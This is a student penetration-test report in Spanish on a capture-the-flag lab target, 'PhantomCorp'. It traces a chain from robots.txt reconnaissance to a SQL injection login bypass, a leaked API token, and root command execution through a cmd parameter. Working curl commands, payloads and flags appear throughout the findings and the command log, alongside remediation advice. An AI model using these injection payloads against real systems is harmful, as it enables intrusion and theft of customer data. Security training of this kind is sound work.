# Informe de Penetration Test — PhantomCorp "Clientes"

**Cliente:** PhantomCorp S.A.  ·  **Auditor (grupo):** 10
**Integrantes:** Belén Rocío Ramello — @belramello · Carolina Paula Corazza — @carocor1 · Chiara Agustina Kordek — @chiarakordek · Juan Pablo Saby — @JuanSaby
**Fecha:** 06/11/2026  ·  **Tipo:** Caja negra  ·  **Alcance:** host `phantomcorp` (lab)

## 0. Declaración de uso de IA

---

## 1. Resumen ejecutivo

- **Qué se hizo:** una auditoría de caja negra sobre el sistema "Clientes" de PhantomCorp, sin credenciales ni documentación previas, limitada al host `phantomcorp` del laboratorio.
- **Resultado global:** se comprometió el sistema de punta a punta. Se localizó un portal interno que no estaba enlazado desde el sitio público, se obtuvo acceso a él sin credenciales válidas mediante una inyección SQL, se recuperó un token de API desde un archivo de configuración accesible sin autenticación y, con ese token, se logró ejecutar comandos del sistema operativo con privilegios de administrador (`root`), lo que permitió leer el registro de datos de clientes.
- **Riesgo de negocio:** cualquier persona con acceso de red al sistema, sin ninguna credencial, puede llegar por este mismo camino a leer el registro completo de clientes (nombre, DNI y tarjeta, 48.210 registros según el propio sistema) y a ejecutar cualquier comando con privilegios de administrador en el servidor. Esto implica exposición de datos personales y financieros de clientes, y control total del servidor que los almacena.
- **Recomendación prioritaria:** corregir el endpoint que ejecuta comandos del sistema operativo con datos recibidos del cliente (hallazgo H-01). Es el eslabón que convierte el acceso a un token de API en control total del servidor; corregirlo no resuelve toda la cadena, pero elimina de inmediato el camino hacia los datos de clientes y hacia el servidor, mientras se corrigen el resto de los hallazgos.

| Severidad | Cantidad de hallazgos |
|---|---|
| Crítica | 1 |
| Alta | 2 |
| Media | 1 |
| Baja | 0 |

---

## 2. Alcance y metodología

**Alcance:** únicamente el host `phantomcorp` del laboratorio, según las Rules of Engagement del práctico. No se auditó ningún otro host, no se ejecutó ninguna acción destructiva (no se borraron ni modificaron datos) y no se usó el token de API hallado para nada más que demostrar el impacto descripto en este informe.

**Metodología:** se siguió el marco de un engagement de caja negra, en cuatro fases encadenadas, cada una dependiente de la anterior:

1. **Reconocimiento y enumeración:** se consultó la página pública y `robots.txt` buscando rutas no enlazadas.
2. **Explotación:** sobre el portal encontrado, se probó una inyección SQL clásica en el formulario de login para intentar un acceso sin credenciales (foothold).
3. **Post-explotación:** desde el acceso logrado, se buscó información adicional que habilitara un paso más; se siguió una pista textual de la propia respuesta de la aplicación hasta un archivo de configuración con credenciales y un token de API.
4. **Impacto:** se usó el token para interactuar con un endpoint interno de la API y, a partir de él, se llegó a leer el archivo con los datos de clientes.

Todas las solicitudes se hicieron con `curl` desde la consola `cyberlab-attacker`, contra el contenedor `cyberlab-phantomcorp`, sin herramientas de explotación automatizada ni fuzzers. En ningún momento del engagement se leyó el código fuente del servidor (`labs/labfinal-practico-integrador/entorno/phantomcorp/server.py`) ni la guía de solución del laboratorio (`docs/solucion.md`): cada hallazgo se obtuvo exclusivamente a partir de las respuestas HTTP observadas, para que la auditoría y su evidencia reflejen un trabajo de caja negra real.

---

## 3. Narrativa del ataque

```
recon/enum  ->  foothold  ->  loot  ->  impacto
```

El sitio público de PhantomCorp (`GET /`) solo mostraba un portal informativo sin pistas visibles. `robots.txt` reveló la ruta `/portal-rrhh`, marcada como no indexable, que resultó ser un portal interno de RR.HH. con un formulario de login — exactamente el "portal interno que no está linkeado" que pedía el primer hito (**R1**, `FLAG{final_recon_portal}`).

Sobre ese formulario (`POST /portal/login`), un intento normal con credenciales inventadas devolvió `401 Unauthorized`. Probar el clásico `user=admin' --` devolvió `200 OK` con un saludo de bienvenida a `admin` y acceso a un "Dashboard RRHH": la inyección SQL comentó la verificación de la contraseña y permitió entrar sin ninguna credencial válida, el foothold del segundo hito (**R2**, `FLAG{final_sqli_foothold}`).

La respuesta de ese mismo dashboard no se limitó a saludar: incluyó el texto "Backup de config disponible en: `/backup/rrhh.conf`". Pedir esa ruta, sin ninguna autenticación adicional, devolvió un archivo de texto plano con `DB_USER`, `DB_PASS` y, sobre todo, `API_TOKEN=phantom-api-7c1e`, junto con la instrucción de cómo usarlo en `/api/reporte?token=...&cmd=...`. Ese fue el secreto looteado del tercer hito (**R3**, `FLAG{final_token_looted}`).

Siguiendo esa instrucción, `GET /api/reporte` sin token devolvió `403 Forbidden` ("token invalido; conseguilo del backup de RRHH"), confirmando que el token era la llave. Con el token y `cmd=id`, la respuesta devolvió `uid=0(root) gid=0(root) groups=0(root)`: el parámetro `cmd` se ejecuta directamente en una shell del sistema, con privilegios de administrador. Desde ahí, `find /app -maxdepth 3 -type f` localizó `/app/priv/clientes.db.txt`, y `cat` sobre ese archivo devolvió "clientes: 48.210 registros (nombre, DNI, tarjeta)" junto con el cuarto y último hito (**R4**, `FLAG{final_crown_jewels}`): los "crown jewels" del sistema, los datos de clientes.

La cadena completa, entonces, fue: **un portal sin enlazar, descubierto por `robots.txt`** → **una inyección SQL que bypasseó el login** → **un mensaje de la propia aplicación que delató un backup sin protección, con un token de API adentro** → **ese token, usado contra un endpoint que ejecuta comandos del sistema, dio control total del servidor y acceso a los datos de clientes**.

---

## 4. Hallazgos (detalle técnico)

### H-01 · Ejecución remota de comandos en `/api/reporte` mediante el parámetro `cmd`
- **Severidad:** Crítica · **CVSS:** 9.9 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- **Ubicación:** `GET /api/reporte?token=...&cmd=...`
- **Descripción:** el endpoint toma el parámetro `cmd` y lo ejecuta directamente en una shell del sistema operativo, sin ninguna restricción de comandos ni de caracteres. El acceso está condicionado a un token estático (`API_TOKEN`), pero una vez obtenido ese token —en este caso, desde un archivo de configuración expuesto (H-03)— cualquier comando se ejecuta con los privilegios del proceso del servidor, que en este contenedor es `root`.
- **Evidencia (reproducible):**
  ```bash
  # Sin token: el endpoint rechaza la solicitud.
  curl -sS -i -G http://phantomcorp/api/reporte --data-urlencode "cmd=id"
  # HTTP/1.0 403 Forbidden
  # token invalido; conseguilo del backup de RRHH

  # Con el token looteado en H-03, cmd=id confirma ejecucion como root:
  curl -sS -i -G http://phantomcorp/api/reporte \
    --data-urlencode "token=phantom-api-7c1e" --data-urlencode "cmd=id"
  # HTTP/1.0 200 OK
  # $ id
  # uid=0(root) gid=0(root) groups=0(root)

  # Localizacion y lectura de los datos de clientes (solo lectura):
  curl -sS -i -G http://phantomcorp/api/reporte \
    --data-urlencode "token=phantom-api-7c1e" \
    --data-urlencode "cmd=find /app -maxdepth 3 -type f"
  # /app/priv/clientes.db.txt
  # /app/server.py

  curl -sS -i -G http://phantomcorp/api/reporte \
    --data-urlencode "token=phantom-api-7c1e" \
    --data-urlencode "cmd=cat /app/priv/clientes.db.txt"
  # clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
  ```
  Evidencia completa en `evidencia/07_api_sin_token.txt`, `08_api_token_id.txt`, `09_api_find_app.txt` y `10_api_crown_jewels.txt`.
- **Impacto:** control total del sistema operativo del servidor (lectura, ejecución de cualquier comando) con privilegios de `root`, y a través de él, lectura de cualquier archivo accesible al proceso, incluido el registro completo de clientes (48.210 registros con nombre, DNI y número de tarjeta). Es el paso que convierte un token de API filtrado en compromiso total del host.
- **Remediación:** eliminar la ejecución de comandos de shell a partir de entrada del cliente. Si el endpoint necesita ofrecer funciones administrativas puntuales, implementarlas como funciones de código con una lista cerrada de operaciones permitidas (allowlist), sin invocar un intérprete de comandos ni pasarle texto del usuario. Si de verdad se requiere ejecutar comandos del sistema, usar una lista de argumentos sin shell intermedia (evitando `shell=True` o equivalentes), validar cada argumento contra un patrón estricto y ejecutar el proceso con el menor privilegio posible, nunca como `root`.

### H-02 · Inyección SQL con bypass de autenticación en `/portal/login`
- **Severidad:** Alta · **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Ubicación:** `POST /portal/login` (parámetros `user`, `pass`)
- **Descripción:** el formulario de login concatena los valores recibidos en una consulta SQL sin parametrizar. Enviar `user=admin' --` comenta la comparación de la contraseña en la consulta, de modo que la aplicación autentica como `admin` sin conocer ninguna contraseña válida.
- **Evidencia (reproducible):**
  ```bash
  # Referencia: credenciales inventadas, sin SQLi.
  curl -sS -i -X POST http://phantomcorp/portal/login -d "user=test&pass=test"
  # HTTP/1.0 401 Unauthorized
  # Credenciales invalidas

  # Payload de inyeccion SQL en el campo user:
  curl -sS -i -X POST http://phantomcorp/portal/login \
    --data-urlencode "user=admin' --" --data-urlencode "pass=x"
  # HTTP/1.0 200 OK
  # Bienvenido admin. Dashboard RRHH.
  # FLAG{final_sqli_foothold}
  # Backup de config disponible en: /backup/rrhh.conf
  ```
  Evidencia completa en `evidencia/04_login_normal.txt` y `05_login_sqli.txt`.
- **Impacto:** cualquier persona sin credenciales obtiene acceso de administrador al portal interno de RR.HH., y con él, a cualquier información que ese panel decida mostrarle. En este caso, el propio panel reveló además la ubicación de un backup con credenciales y un token de API (H-03), lo que encadena este hallazgo con el compromiso total descripto en H-01.
- **Remediación:** reemplazar la consulta concatenada por una consulta parametrizada (placeholders `?`/`%s` según el motor), que separe el texto SQL fijo de los valores recibidos. Además, no depender solo de la contraseña: aplicar hash seguro con sal a las contraseñas almacenadas y, para un panel administrativo, sumar un segundo factor de autenticación.

### H-03 · Archivo de configuración con credenciales y token de API accesible sin autenticación
- **Severidad:** Alta · **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Ubicación:** `GET /backup/rrhh.conf`
- **Descripción:** el servidor sirve un archivo de configuración de texto plano con credenciales de base de datos y un token de API fijo, sin exigir ninguna autenticación para descargarlo. Su ubicación quedó expuesta en un mensaje de la propia aplicación (H-02), pero el archivo en sí no tiene ningún control de acceso: cualquiera que conozca o adivine la ruta puede leerlo directamente.
- **Evidencia (reproducible):**
  ```bash
  curl -sS -i http://phantomcorp/backup/rrhh.conf
  # HTTP/1.0 200 OK
  # DB_USER=rrhh_app
  # DB_PASS=Rh-2026
  # API_TOKEN=phantom-api-7c1e
  # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
  ```
  Evidencia completa en `evidencia/06_backup_rrhh_conf.txt`.
- **Impacto:** exposición directa de credenciales de base de datos y de un token de API válido, sin necesidad de ninguna otra vulnerabilidad para leer el archivo una vez conocida la ruta. Ese token es, en este sistema, la llave que habilita H-01.
- **Remediación:** no publicar backups ni archivos de configuración dentro del árbol servido por el servidor web; si deben generarse, guardarlos fuera del directorio público y con permisos restringidos. Los secretos (contraseñas de base de datos, tokens de API) no deben guardarse en texto plano en archivos desplegados junto a la aplicación: usar un gestor de secretos o variables de entorno inyectadas en tiempo de ejecución, y rotarlos si hay sospecha de exposición. Los tokens de API deben ser aleatorios, con expiración, y nunca reutilizables indefinidamente como un valor fijo.

### H-04 · Portal interno de RR.HH. expuesto sin controles de acceso de red, descubierto por `robots.txt`
- **Severidad:** Media · **CVSS:** 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
- **Ubicación:** `GET /robots.txt`, `GET /portal-rrhh`
- **Descripción:** `robots.txt` lista `/portal-rrhh` como ruta a no indexar, pero esa instrucción solo aplica a rastreadores que la respeten; no es un control de acceso. La ruta responde igual a cualquier cliente, y el propio portal queda accesible en la misma red que el sitio público, sin restricción de origen ni autenticación de red.
- **Evidencia (reproducible):**
  ```bash
  curl -sS -i http://phantomcorp/robots.txt
  # User-agent: *
  # Disallow: /portal-rrhh

  curl -sS -i http://phantomcorp/portal-rrhh
  # HTTP/1.0 200 OK
  # ...Portal interno RRHH...
  # FLAG{final_recon_portal}
  ```
  Evidencia completa en `evidencia/02_robots.txt` y `03_portal_rrhh.txt`.
- **Impacto:** por sí solo, este hallazgo solo revela la existencia de un sistema interno y su formulario de login; no expone datos sensibles. Pero es el primer eslabón de toda la cadena: sin esta exposición, el resto del engagement (H-02, H-03, H-01) no habría tenido un punto de entrada.
- **Remediación:** restringir el acceso de red al portal interno (VPN, lista de IPs permitidas o segmento administrativo separado), en vez de depender de que la ruta no esté enlazada ni listada en `robots.txt`. `robots.txt` puede seguir existiendo para rastreadores legítimos, pero no debe ser la única barrera frente a un sistema que se asume "interno".

---

## 5. Conclusión

La postura de seguridad general de PhantomCorp "Clientes" es débil: cuatro fallas independientes, ninguna sofisticada por sí sola, se encadenaron sin fricción hasta el compromiso total del servidor y la lectura de datos de clientes. Cada eslabón individual (un portal sin controles de red, una consulta SQL sin parametrizar, un backup sin protección, un endpoint que ejecuta comandos de shell) es un error conocido y evitable con prácticas estándar (segmentación de red, consultas parametrizadas, gestión de secretos, no invocar una shell con datos del usuario).

La cadena era evitable en más de un punto, pero el eslabón que la habría cortado más temprano, antes de que existiera cualquier acceso no autorizado, es **H-02** (la inyección SQL en el login). Sin ese bypass, el atacante solo tenía un formulario de login legítimo frente a sí: no habría visto el mensaje que delataba el backup (H-03), y por lo tanto no habría obtenido el token que habilitó la ejecución de comandos (H-01). Corregir H-02 con una consulta parametrizada habría detenido el engagement completo en el segundo hito. Dicho esto, la defensa correcta no es confiar en un solo punto de corte: H-03 y H-01 son vulnerabilidades graves por derecho propio y deben corregirse igual, porque un atacante que llegue al backup por otro camino (por ejemplo, adivinando la ruta sin pasar por el login) encontraría la misma cadena abierta a partir de ahí.

---

## 6. Anexo

### 6.1 Bitácora de comandos

Todas las solicitudes se ejecutaron desde la consola `cyberlab-attacker` contra el objetivo `phantomcorp`, en la red `cyberlab_labnet`, levantada con:

```bash
docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labfinal-practico-integrador/entorno/target.compose.yml up -d --build
```

En orden de ejecución:

```bash
# 1. Reconocimiento
curl -sS -i http://phantomcorp/
curl -sS -i http://phantomcorp/robots.txt
curl -sS -i http://phantomcorp/portal-rrhh

# 2. Explotacion (SQLi en el login)
curl -sS -i -X POST http://phantomcorp/portal/login -d "user=test&pass=test"
curl -sS -i -X POST http://phantomcorp/portal/login --data-urlencode "user=admin' --" --data-urlencode "pass=x"

# 3. Post-explotacion (backup con token de API)
curl -sS -i http://phantomcorp/backup/rrhh.conf

# 4. Impacto (ejecucion de comandos con el token looteado)
curl -sS -i -G http://phantomcorp/api/reporte --data-urlencode "cmd=id"
curl -sS -i -G http://phantomcorp/api/reporte --data-urlencode "token=phantom-api-7c1e" --data-urlencode "cmd=id"
curl -sS -i -G http://phantomcorp/api/reporte --data-urlencode "token=phantom-api-7c1e" --data-urlencode "cmd=find /app -maxdepth 3 -type f"
curl -sS -i -G http://phantomcorp/api/reporte --data-urlencode "token=phantom-api-7c1e" --data-urlencode "cmd=cat /app/priv/clientes.db.txt"

# 5. Validacion de las flags con el motor oficial (desde la raiz del repositorio, no desde la consola attacker)
./ctf status final
./ctf submit final R1 'FLAG{final_recon_portal}'
./ctf submit final R2 'FLAG{final_sqli_foothold}'
./ctf submit final R3 'FLAG{final_token_looted}'
./ctf submit final R4 'FLAG{final_crown_jewels}'
./ctf status final
```

No se ejecutó ningún comando destructivo (sin `rm`, sin modificaciones de archivos, sin interrupción de servicios); todas las operaciones mediante `cmd=` fueron de solo lectura (`id`, `find`, `cat`).

### 6.2 Evidencias

Todas las salidas crudas, sin editar, están en `evidencia/`:

| Archivo | Contenido |
|---|---|
| `01_root.txt` | Respuesta de `GET /` |
| `02_robots.txt` | Respuesta de `GET /robots.txt` |
| `03_portal_rrhh.txt` | Respuesta de `GET /portal-rrhh` (R1) |
| `04_login_normal.txt` | Login con credenciales de referencia (401) |
| `05_login_sqli.txt` | Login con el payload de SQLi (R2) |
| `06_backup_rrhh_conf.txt` | Backup con credenciales y token de API (R3) |
| `07_api_sin_token.txt` | `/api/reporte` sin token (403, referencia) |
| `08_api_token_id.txt` | `/api/reporte` con token, `cmd=id` (confirma RCE como root) |
| `09_api_find_app.txt` | Localización de `clientes.db.txt` |
| `10_api_crown_jewels.txt` | Lectura del archivo de clientes (R4) |
| `11_status_antes.txt` | `./ctf status final` antes de entregar, `0/4` |
| `12_submit_r1.txt` a `15_submit_r4.txt` | Entregas de cada flag, aceptadas por el motor oficial |
| `16_status_despues.txt` | `./ctf status final` después de entregar, `4/4` |

### 6.3 Salida de `./ctf status final`

```text
  ╭────────────────────────────────────────────────────────────╮
  │                   PROGRESO · LAB final                    │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Recon/enum: portal interno localizado
   ✓  R2     Explotacion: foothold por SQLi
   ✓  R3     Post: token de API looteado
   ✓  R4     Impacto: crown jewels (datos de clientes)

  ██████████████████████████████  4/4 (100%)

[ OK ] ¡Lab final COMPLETO! Ponete las pilas con la próxima unidad.
```
